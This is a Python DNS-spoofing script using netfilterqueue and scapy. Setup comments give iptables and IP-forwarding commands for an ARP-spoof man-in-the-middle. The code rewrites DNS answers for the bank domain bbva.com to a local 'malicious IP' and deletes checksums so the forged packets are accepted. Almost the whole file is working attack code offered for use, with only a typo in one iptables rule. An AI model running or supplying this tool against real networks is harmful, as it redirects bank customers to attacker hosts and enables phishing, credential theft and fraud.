#!/usr/bin/env python3 
import netfilterqueue, signal, sys, os
import scapy.all as scapy
from termcolor import colored

# All packets to a queue with NetFilter and handle / manipulate this with netfilterqueue

# Add 3 new rules with iptables for DNS spoofing: 

# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I FODWARD -j NFQUEUE --queue-num 0 

# Change 1 policy with iptables for ARP Spoof and change for 1 value /proc/sys/net/ipv4/ip_forward

# iptables --policy FORWARD ACCEPT
# echo 1 > /proc/sys/net/ipv4/ip_forward 

# Now, the last pass, isntall netfilterqueue (pip3)

# pip3 install netfilterqueue



# Ctrl + C

def ctrl_c(sig, frame):
    print(colored("\n\n\t[!] Quiting...\n\n", "red"))
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Process incoming packets 

def process_packet(packet): 
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname.decode()
        
        if "bbva.com" in qname: # Domain to poison
            print(colored("[+] Poisoning bbva.com domain", "yellow"))
            answer_packet = scapy.DNSRR(rrname=qname, rdata="192.168.1.35") # Malicious IP
            scapy_packet[scapy.DNS].an = answer_packet
            scapy_packet[scapy.DNS].ancount = 1

            # Change the values for bypass packet modify validation 
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.IP].len

            #print(scapy_packet.show())
            # Modify the original packet for the new one
            packet.set_payload(scapy_packet.build())

    packet.accept() # Accept incoming packets 
    # packet.drop() # Reject incoming packets


if __name__ == "__main__":
    if os.getuid() == 0:
        while True:
            queue = netfilterqueue.NetfilterQueue()
            queue.bind(0, process_packet)
            queue.run()
    
    else:
        print(colored("\n\n\t[!] This script need runed like sudo.\n\n", "red"))